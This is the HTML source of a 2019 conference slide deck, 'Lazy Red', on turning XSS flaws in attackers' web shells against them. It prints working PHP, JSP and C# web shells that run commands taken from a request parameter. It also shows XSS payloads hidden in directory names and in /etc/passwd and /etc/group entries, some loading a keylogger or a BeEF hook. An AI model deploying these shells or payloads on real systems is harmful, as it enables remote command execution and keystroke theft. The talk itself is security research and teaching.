@@ -1,0 +1,464 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Lazy Red</title>
+
+		<meta name="description" content="Lazy Red">
+		<meta name="author" content="VK">
+
+		<meta name="apple-mobile-web-app-capable" content="yes" />
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/diverto.css" id="theme">
+
+		<!-- Code syntax highlighting -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+                        <div class="slides">
+                                <section>
+					<img src="images/diverto-logo.png" border="0">
+                                        <h1>Lazy Red</h1>
+                                        <h3>When hunter becomes the hunted</h3>
+                                        <h3></h3>
+                                        <p>
+                                                <small>Vlatko Kosturjak (<a href="https://twitter.com/k0st">@k0st</a>), <a href="https://balccon.org">BalCCon 2k19, 14th of September, 2019</a></small>
+                                        </p>
+                                </section>
+
+                                <section>
+                                        <h2>Agenda</h2>
+                                        <ul>
+                                                <li>Introduction</li>
+                                                <li>Vulnerabilites</li>
+						<li>Exploiting vulnerabilities</li>
+						<li>Legality</li>
+						<li>Summary</li>
+						<li>Questions and answers</li>
+                                        </ul>
+                                        <p align="right">30 minutes</p>
+                                        <aside class="notes">
+                                                This is what we will cover in this presentation.
+                                        </aside>
+                                </section>
+
+				<section>
+					<section>
+						<h2>About me</h2>
+						<ul>
+							<li>CTO at Diverto</li>
+							<ul>
+								<li>We're hiring</li>
+								<li>red/blue</li>
+							</ul>
+							<li>Open source (security) developer</li>
+							<ul>
+								<li>Contributed to many existing...</li>
+								<li>Authored own <a href="https://github.com/kost">https://github.com/kost</a></li>
+							</ul>
+						</ul>
+					</section>
+
+				</section>
+
+				<section>
+
+				<section>
+					<h2>Anyone used web shell?</h2>
+					<ul>
+						<img src="images/ws-fuzzdb.png" />
+						<small><li><a href="https://github.com/fuzzdb-project/fuzzdb">fuzzdb</a></li></small>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Typical usage</h2>
+					<ul>
+						<img src="images/ws-linux-ls.png" />
+						<small><li>Usually placed on exploited applications/server</li></small>
+					</ul>
+				</section>
+
+				<section>
+					<h2>PHP?</h2>
+					<ul>
+					<pre><code data-trim contenteditable>	
+&lt;?
+?&gt;
+&lt;HTML&gt;&lt;BODY&gt;
+&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;
+&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;
+&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;
+&lt;/FORM&gt;
+&lt;pre&gt;
+&lt;?
+if($_GET['cmd']) {
+  system($_GET['cmd']);
+  }
+?&gt;
+&lt;/pre&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+
+					</code></pre>
+					</ul>
+				</section>
+
+				<section>
+					<h2>JSP?</h2>
+					<ul>
+					<pre><code data-trim contenteditable>	
+&lt;FORM METHOD=GET ACTION='cmdjsp.jsp'&gt;
+&lt;INPUT name='cmd' type=text&gt;
+&lt;INPUT type=submit value='Run'&gt;
+&lt;/FORM&gt;
+&lt;%@ page import=&quot;java.io.*&quot; %&gt;
+&lt;%
+   String cmd = request.getParameter(&quot;cmd&quot;);
+   String output = &quot;&quot;;
+
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec(&quot;cmd.exe /C &quot; + cmd);
+         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) {
+            output += s;
+         }
+      }
+      catch(IOException e) {
+         e.printStackTrace();
+      }
+   }
+%&gt;
+&lt;pre&gt;
+&lt;%=output %&gt;
+&lt;/pre&gt;
+
+					</code></pre>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Even smallest ones?</h2>
+					<ul>
+						<pre><code data-trim contenteditable>	
+&lt;?=`$_GET[1]`?&gt;
+						</code></pre>
+						<pre><code data-trim contenteditable>	
+&lt;%@Page Language=&rdquo;C#&rdquo;%&gt;&lt;%var p=new System.Diagnostics.Process{StartInfo={FileName=Request[&ldquo;c&rdquo;],UseShellExecute=false,RedirectStandardOutput=true}};p.Start();%&gt;&lt;%=p.StandardOutput.ReadToEnd()%&gt;
+						</code></pre>
+					</ul>
+				</section>
+
+				</section>
+
+
+				<section>
+
+				<section>
+					<ul>
+						<img src="images/ws-linux-al.png" />
+						<small><li>Executing standard shell on Linux</li></small>
+					</ul>
+				</section>
+
+				<section>
+					<ul>
+						<img src="images/ws-windows.png" />
+						<small><li>Executing standard shell on Windows</li></small>
+					</ul>
+				</section>
+
+				<section>
+					<ul>
+						<img src="images/ws-source.png" />
+						<small><li>Shell on Windows - HTML source</li></small>
+					</ul>
+				</section>
+
+				<section>
+					<ul>
+						<img src="images/ws-inspect.png" />
+						<small><li>Shell on Windows - HTML inspect</li></small>
+					</ul>
+				</section>
+
+				<section>
+					<ul>
+						<img src="images/ws-dir.png" />
+						<small><li>HTML tag - dir</li></small>
+					</ul>
+				</section>
+
+
+				</section>
+
+
+
+				<section>
+
+				<section>
+					<h2>Hmm..that means?</h2>
+					<ul>
+						<li>I can insert any HTML tag?</li>
+						<ul>
+							<li>Just need to make it filename or dirname</li>
+						</ul>
+						<li>Filesystem issues</li>
+						<ul>
+							<li>Slash character "<B>/</B>"</li>
+							<li>HTML ending and protocol specification)</li>
+							<li>You cannot specify (https:// or //my.evil.com/blah)</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<blockquote>Is there any HTML tag which does not have to end with "/"?
+					</blockquote>
+				</section>
+
+				<section>
+					<h2>IMG comes to rescue</h2>
+					<ul>
+						<pre><code data-trim contenteditable>	
+mkdir '<img src="badboy.jpg">'
+						</code></pre>
+						<pre><code data-trim contenteditable>	
+mkdir '<img src="uYaTie5ahphiequai8uF0Gom">'
+						</code></pre>
+					</ul>
+				</section>
+
+				<section>
+					<ul>
+						<img src="images/ws-badboy.png" />
+						<small><li>Displaying images</li></small>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Executing Javascript</h2>
+					<ul>
+						<pre><code data-trim contenteditable>	
+mkdir '&lt;img src=&quot;&quot; onerror=&quot;alert(1)&quot;&gt;'
+						</code></pre>
+						<pre><code data-trim contenteditable>	
+						</code></pre>
+					</ul>
+				</section>
+
+				<section>
+					<ul>
+						<img src="images/ws-xss.png" />
+						<small><li>XSS on web shell</li></small>
+					</ul>
+				</section>
+
+				<section>
+					<h2>/etc/group</h2>
+					<ul>
+						<pre><code data-trim contenteditable>	
+[..]
+nobody:x:65534:
+www-data&lt;script src=&quot;/shell/key/keylogger.js&quot;&gt;&lt;/script&gt;:x:82:apache           
+apache:x:101:apache
+[..]
+						</code></pre>
+					</ul>
+				</section>
+
+				<section>
+					<ul>
+						<img src="images/ws-id.png" />
+						<small><li>Stealthy keyboard sniffing</li></small>
+					</ul>
+				</section>
+
+				<section>
+					<h2>/etc/passwd</h2>
+					<ul>
+						<pre><code data-trim contenteditable>	
+[..]
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server&lt;script src=&quot;http://127.0.0.1:3000/hook.js&quot;&gt;&lt;/script&gt;:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+[..]
+						</code></pre>
+					</ul>
+				</section>
+
+				<section>
+					<ul>
+						<img src="images/ws-passwd.png" />
+						<small><li>Stealthy beef is running</li></small>
+					</ul>
+				</section>
+
+				<section>
+					<ul>
+						<img src="images/ws-beef.png" />
+						<small><li>Beef console Panel</li></small>
+					</ul>
+				</section>
+
+				</section>
+
+				<section>
+
+				<section>
+					<h2>Legal issues</h2>
+					<ul>
+						<li>Not a lawyer</li>
+						<ul>
+							<li>It depends...</li>
+							<li>Local laws and regulations</li>
+						</ul>
+						<li>Issue</li>
+						<ul>
+							<li>Basically exploiting vulnerability in attacker shell</li>
+						</ul>
+						<li>Drawing the line</li>
+						<ul>
+							<li>Redirecting to browser pwn?</li>
+						</ul>
+					</ul>
+				</section>
+
+				</section>
+
+
+				<section>
+
+				<section>
+					<h2>How to fix it</h2>
+					<ul>
+						<li>Standard fixing of XSS</li>
+						<ul>
+							<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">OWASP XSS cheat sheet</a></li>
+						</ul>
+						<li>Summary</li>
+						<ul>
+							<li>Escape your HTML before displaying the command output</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section>
+					<h2>When it will not work?</h2>
+					<ul>
+						<li>When attacker disables javascript?</li>
+						<ul>
+							<li>HTML tag IMG will still work!</li>
+						</ul>
+					</ul>
+						<pre><code data-trim contenteditable>	
+&gt; curl 'http://127.0.0.1/shell/shell.php?cmd=ls+%2F'
+&lt;html&gt;
+&lt;body&gt;
+&lt;form method=&quot;GET&quot; name=&quot;shell.php&quot;&gt;
+&lt;input type=&quot;TEXT&quot; name=&quot;cmd&quot; id=&quot;cmd&quot; size=&quot;80&quot;&gt;
+&lt;input type=&quot;SUBMIT&quot; value=&quot;Execute&quot;&gt;
+&lt;/form&gt;
+&lt;pre&gt;
+&lt;img src=&quot;badboy.jpg&quot;&gt;
+app
+bin
+dev
+etc
+home
+[..]
+						</code></pre>
+					<li>When attacker is using curl/wget</li>
+				</section>
+
+				</section>
+
+
+				<section>
+					<h2>Summary</h2>
+					<ul>
+						<li>is it 0-day in webshells?</li>
+						<ul>
+							<li>"Only" XSS</li>
+						</ul>
+						<li>If you're pentester/red teamer</li>
+						<ul>
+							<li>Fix your webshells</li>
+						</ul>
+						<li>If you're app developer/blue teamer</li>
+						<ul>
+							<li>Interesting way to detect attacker</li>
+						</ul>
+					</ul>
+				</section>
+
+
+		                 <section>
+                                        <h3>Thanks on listening</h3>
+                                        <h1>?</h1>
+                                        <h3>Any questions?</h3>
+					<h3><a href="https://twitter.com/k0st">@k0st</a></h3>
+					<p></p>
+					<h3>Press &lt;ESC&gt; for overview</h3>
+                                </section>
+
+			</div>
+
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.js"></script>
+
+		<script>
+
+			// Full list of configuration options available at:
+			// https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+				slideNumber: true,
+
+				transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+				// Optional reveal.js plugins
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, condition: function() { return !!document.querySelector( 'pre code' ); }, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/zoom-js/zoom.js', async: true },
+					{ src: 'plugin/notes/notes.js', async: true }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
